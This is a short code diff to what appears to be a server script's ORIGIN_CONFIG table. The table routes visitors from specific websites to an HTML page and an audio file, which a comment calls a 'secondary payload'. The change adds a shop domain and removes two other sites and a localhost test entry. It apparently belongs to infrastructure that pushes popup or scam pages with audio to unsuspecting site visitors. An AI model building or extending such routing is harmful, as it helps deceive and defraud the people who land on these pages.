@@ -196,21 +196,13 @@ async function checkIPRate(ip) {
 // as the secondary payload for visitors from that origin.
 // Add/remove entries here to onboard new sites.
 const ORIGIN_CONFIG = {
-  "https://baldwinservesfood.live": {
-    html: "rocky1.html",
-    audio1: "https://audio.jukehost.co.uk/RTaK1bOF2dVBvCPxzqQZTVr2ScWfWnj9",
-  },
-  "https://horizontravelss.com": {
+  "https://voltexelectronic.shop": {
     html: "sallu1.html",
-    audio1: "https://audio.jukehost.co.uk/RTaK1bOF2dVBvCPxzqQZTVr2ScWfWnj9",
+    audio1: "https://files-pop.s3.ap-northeast-1.amazonaws.com/aud-input.mp3",
   },
   "https://kotonohaschooljp.d28gh8vatsn4mi.amplifyapp.com": {
     html: "dmc1.html",
     audio1: "https://files-pop.s3.ap-northeast-1.amazonaws.com/aud-input.mp3",
-  },
-  "http://127.0.0.1:5500": {
-    html: "rocky1.html",
-    audio1: "https://audio.jukehost.co.uk/RTaK1bOF2dVBvCPxzqQZTVr2ScWfWnj9",
   },
 };
 
